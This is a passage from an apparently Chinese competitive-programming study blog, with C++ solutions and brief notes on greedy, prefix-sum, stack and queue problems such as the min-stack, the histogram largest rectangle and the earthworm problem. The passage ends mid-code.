id="耍杂技的牛">耍杂技的牛</h4><p>与国王的游戏相似</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">50010</span>;<br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br>PII cows[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> w, s;<br>cin &gt;&gt; w &gt;&gt; s;<br>cows[i] = &#123; w + s, w &#125;;<br>&#125;<br><span class="hljs-built_in">sort</span>(cows, cows + n);<br><span class="hljs-type">int</span> sumw = <span class="hljs-number">0</span>;   <span class="hljs-comment">//前缀和，只使用一次</span><br><span class="hljs-type">int</span> ans = <span class="hljs-number">-2e9</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)   <span class="hljs-comment">//答案不一定在最后一只</span><br>&#123;<br><span class="hljs-type">int</span> w = cows[i].second;<br><span class="hljs-type">int</span> s = cows[i].first - w;<br><span class="hljs-type">int</span> tmp = sumw - s;<br>ans = <span class="hljs-built_in">max</span>(ans, tmp);<br>sumw += w;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最大的和">最大的和</h4><p>如果枚举端点，需要4个for循环</p><p>可以枚举行边界，把同列压缩为一行，转化为求一维最大前缀和</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">110</span>;<br><span class="hljs-type">int</span> colsum[N][N];<br><span class="hljs-type">int</span> g[N][N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>&#123;<br>cin &gt;&gt; g[i][j];<br>colsum[i][j] = colsum[i - <span class="hljs-number">1</span>][j] + g[i][j];<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">-2e9</span>;<br><span class="hljs-comment">//枚举边界i,j</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt;= n; j++)<br>&#123;<br><span class="hljs-type">int</span> last = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++)   <span class="hljs-comment">//一维前缀和</span><br>&#123;<br><span class="hljs-keyword">if</span> (last &gt;= <span class="hljs-number">0</span>) last += colsum[j][k] - colsum[i<span class="hljs-number">-1</span>][k];<br><span class="hljs-keyword">else</span> last = colsum[j][k] - colsum[i - <span class="hljs-number">1</span>][k];<br>ans = <span class="hljs-built_in">max</span>(ans, last);<br>&#125;<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="任务">*任务</h4><p>（二分图匹配）</p><h2 id="基本数据结构">基本数据结构</h2><h3 id="栈">栈</h3><h4 id="包含min的栈">包含min的栈</h4><p>维护一个最小值的栈</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MinStack</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/** initialize your data structure here. */</span><br>    stack&lt;<span class="hljs-type">int</span>&gt; values;<br>    stack&lt;<span class="hljs-type">int</span>&gt; mins;<br>    <span class="hljs-built_in">MinStack</span>() &#123;<br>        <br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        values.<span class="hljs-built_in">push</span>(x);<br>        <span class="hljs-keyword">if</span>(mins.<span class="hljs-built_in">empty</span>() || x &lt; mins.<span class="hljs-built_in">top</span>())   <span class="hljs-comment">//mins.empty()一定写在前面（短路）</span><br>        &#123;<br>            mins.<span class="hljs-built_in">push</span>(x);<br>        &#125;<span class="hljs-keyword">else</span><br>        &#123;<br>            mins.<span class="hljs-built_in">push</span>(mins.<span class="hljs-built_in">top</span>());<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        values.<span class="hljs-built_in">pop</span>();<br>        mins.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> values.<span class="hljs-built_in">top</span>();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMin</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> mins.<span class="hljs-built_in">top</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your MinStack object will be instantiated and called as such:</span><br><span class="hljs-comment"> * MinStack obj = new MinStack();</span><br><span class="hljs-comment"> * obj.push(x);</span><br><span class="hljs-comment"> * obj.pop();</span><br><span class="hljs-comment"> * int param_3 = obj.top();</span><br><span class="hljs-comment"> * int param_4 = obj.getMin();</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h4 id="编辑器">编辑器</h4><p>对顶栈</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000010</span>;<br><span class="hljs-type">int</span> stkl[N], stkr[N], topl, topr;<br><span class="hljs-type">int</span> sum[N], maxsum[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>stkl[++topl] = x;<br>sum[topl] = sum[topl - <span class="hljs-number">1</span>] + x;<br>maxsum[topl] = <span class="hljs-built_in">max</span>(maxsum[topl - <span class="hljs-number">1</span>], sum[topl]);  <span class="hljs-comment">//maxsum[0]赋负无穷</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> T;<br>cin &gt;&gt; T;<br>maxsum[<span class="hljs-number">0</span>] = <span class="hljs-number">-2e9</span>;  <br><span class="hljs-keyword">while</span> (T--)<br>&#123;<br><span class="hljs-type">char</span> op;<br>cin &gt;&gt; op;<br><span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;I&#x27;</span>)<br>&#123;<br><span class="hljs-type">int</span> x;<br>cin &gt;&gt; x;<br><span class="hljs-built_in">add</span>(x);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;D&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (topl)<br>&#123;<br>topl--;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;L&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (topl)<br>&#123;<br><span class="hljs-type">int</span> x = stkl[topl];<br>topl--;<br>stkr[++topr] = x;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;R&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (topr)<br>&#123;<br><span class="hljs-type">int</span> x = stkr[topr];<br>topr--;<br><span class="hljs-built_in">add</span>(x);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <br>&#123;<br><span class="hljs-type">int</span> k;<br>cin &gt;&gt; k;<br>cout &lt;&lt; maxsum[k] &lt;&lt; endl;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="火车进栈进出栈序列问题">火车进栈(进出栈序列问题)</h4><h5 id="递归1n辆车o2n">递归(1~n辆车)，O（2^n）</h5><p>两种选择：当前出栈或者下一辆入栈</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">25</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> retain;<br><span class="hljs-type">int</span> stk[N], top;<br>vector&lt;<span class="hljs-type">int</span>&gt; ans;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> t)</span>  <span class="hljs-comment">//t递归所有进栈的车</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (retain == <span class="hljs-number">20</span>) <span class="hljs-keyword">return</span>;<br><span class="hljs-keyword">if</span> (t &gt; n)<br>&#123;<br>retain++;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> x : ans)<br>&#123;<br>cout &lt;&lt; x;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = top; i &gt; <span class="hljs-number">0</span>; i--) cout &lt;&lt; stk[i];<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (top)   <span class="hljs-comment">//先前车出栈</span><br>&#123;<br><span class="hljs-type">int</span> x = stk[top];<br>top--;<br>ans.<span class="hljs-built_in">push_back</span>(x);<br><span class="hljs-built_in">dfs</span>(t);<br>stk[++top] = x;<br>ans.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><span class="hljs-comment">//当前进栈</span><br>stk[++top] = t;<br><span class="hljs-built_in">dfs</span>(t + <span class="hljs-number">1</span>);<br>top--;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="数学on">*数学，O（n）</h5><p>卡特兰数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br></code></pre></td></tr></table></figure><h4 id="表达式求值问题">表达式求值问题</h4><p>常见：中缀表达式</p><p>计算机容易理解：后缀表达式（逆波兰式）</p><h5 id="后缀表达式求值">后缀表达式求值</h5><p>建立存储数的栈</p><ol type="1"><li>遇到数字，入栈；</li><li>遇到运算符，弹出栈顶两个元素，进行运算，结果再入栈</li></ol><h5 id="中缀表达式转换为后缀表达式">中缀表达式转换为后缀表达式</h5><p>建立存储符号的栈：</p><ol type="1"><li>遇到数字，直接输出</li><li>遇到左括号，直接入栈</li><li>遇到右括号，不断弹出运算符并输出，直至遇到左括号，将左括号出栈</li><li>遇到运算符，若top()&gt;=current（乘除&gt;加减&gt;左括号），不断弹出运算符输出，直至栈为空或者top()&lt;current，将current入栈</li></ol><h4 id="直方图中最大的矩形单调栈">直方图中最大的矩形（单调栈）</h4><p>暴力：</p><p>以每个矩形的高度入手，两侧延伸宽度，直至碰到比它矮的，该过程产生的最大值即为答案</p><p>单调栈：</p><p>记录每个矩形可以拓展的左边界，如果左边的矩形比当前矩形高度高，其高度可以不用考虑。</p><p>观察可知，在计算左边界时，靠左的且较高的矩形可以省略，因此可以用单调栈优化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">int</span> height[N];<br><span class="hljs-type">int</span> stkh[N], stkw[N], top;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-keyword">while</span> (cin &gt;&gt; n &amp;&amp; n)<br>&#123;<br>top = <span class="hljs-number">0</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; height[i];<br>&#125;<br>height[n + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//清空栈中剩余的矩形,最后把0矩形入栈，不影响结果</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n + <span class="hljs-number">1</span>; i++)<br>&#123;<br><span class="hljs-type">int</span> h = height[i];<br><span class="hljs-keyword">if</span> (!top || stkh[top] &lt;= h)   <span class="hljs-comment">//在这里取等</span><br>&#123;<br>stkh[++top] = h;<br>stkw[top] = <span class="hljs-number">1</span>;     <span class="hljs-comment">//记录宽度</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-type">int</span> width = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (stkh[top] &gt; h)<br>&#123;<br>width += stkw[top];<br>ans = <span class="hljs-built_in">max</span>(ans, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)width * stkh[top]);<br>top--;<br>&#125;<br>stkh[++top] = h; <br>stkw[top] = width + <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="队列">队列</h3><h4 id="小组队列">小组队列</h4><p>思路：建立n+1个队列，一个记录出队小组的顺序，另外n个记录小组内部的顺序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1010</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> t;<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (cin &gt;&gt; t &amp;&amp; t)<br>&#123;<br>map&lt;string, <span class="hljs-type">int</span>&gt;  person;<br>queue&lt;<span class="hljs-type">int</span>&gt; order;<br>queue&lt;string&gt; groupq[N];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= t; i++)<br>&#123;<br><span class="hljs-type">int</span> x;<br>cin &gt;&gt; x;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; x; j++)<br>&#123;<br>string id;<br>cin &gt;&gt; id;<br>person[id] = i;<br>&#125;<br>&#125;<br>string op;<br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">do</span> &#123;<br>cin &gt;&gt; op;<br><span class="hljs-keyword">if</span> (op[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;E&#x27;</span>)<br>&#123;<br>string p;<br>cin &gt;&gt; p;<br><span class="hljs-type">int</span> id = person[p];<br><span class="hljs-keyword">if</span> (groupq[id].<span class="hljs-built_in">empty</span>())<br>&#123;<br>groupq[id].<span class="hljs-built_in">push</span>(p);<br>order.<span class="hljs-built_in">push</span>(id);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>groupq[id].<span class="hljs-built_in">push</span>(p);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;D&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Scenario #&quot;</span> &lt;&lt; cnt &lt;&lt; endl;<br>flag = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-type">int</span> id = order.<span class="hljs-built_in">front</span>();<br>cout &lt;&lt; groupq[id].<span class="hljs-built_in">front</span>() &lt;&lt; endl;<br>groupq[id].<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">if</span> (groupq[id].<span class="hljs-built_in">empty</span>())<br>&#123;<br>order.<span class="hljs-built_in">pop</span>();<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (op[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;S&#x27;</span>);<br>cnt++;<br>cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="蚯蚓">蚯蚓</h4><p>思路：</p><p>维护三个队列：</p><p>原始蚯蚓：从大到小排序，挑出后出队，分裂段分别放入下面的两个队列</p><p>分裂后的px段：（保持原始队列的单调性）x&gt;y: px+q &gt; p(y+q) , 0&lt; p &lt; 1</p><p>分裂后的x-px段：（保持原始队列的单调性）x&gt;y: x-px+q &gt; y+q-py-pq (x-y &gt; p(x-y) -&gt; x-px &gt; y-py &gt; y - py-pq)</p><p>每次挑选三个队列的最大值，动态维护蚯蚓长度变化时不用遍历队列，维护一个全局delta</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> M = <span class="hljs-number">7000010</span>;<br><span class="hljs-type">int</span> q1[N], h1, t1;<br><span class="hljs-type">int</span> q2[M], h2, t2 = <span class="hljs-number">-1</span>;  <span class="hljs-comment">//队尾插入；取队头元素</span><br><span 